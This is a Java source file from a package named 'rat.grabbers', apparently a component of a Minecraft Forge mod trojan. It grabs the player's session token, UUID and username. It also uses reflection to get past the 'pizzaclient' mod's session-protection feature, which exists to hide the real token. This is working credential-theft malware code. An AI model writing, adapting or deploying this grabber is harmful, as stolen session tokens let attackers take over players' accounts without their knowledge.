package me.veryobvious.rat.grabbers;

import net.minecraft.client.Minecraft;
import net.minecraftforge.fml.relauncher.ReflectionHelper;
import net.minecraftforge.fml.common.Loader;

public class minecraft {
    static Minecraft minecraft = Minecraft.getMinecraft();
    public static String getSession() {
        try {
            String ssid = minecraft.getSession().getToken();
            if (Loader.isModLoaded("pizzaclient")) {
            ssid = (String) ReflectionHelper.findField(Class.forName("qolskyblockmod.pizzaclient.features.misc.SessionProtection"), "changed").get(null);
            }
        return ssid;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String getUuid() {
        String uuid = minecraft.getSession().getProfile().getId().toString();
        return uuid;
    }

    public static String getUsername() {
        String username = minecraft.getSession().getProfile().getName();
        return username;
    }
}
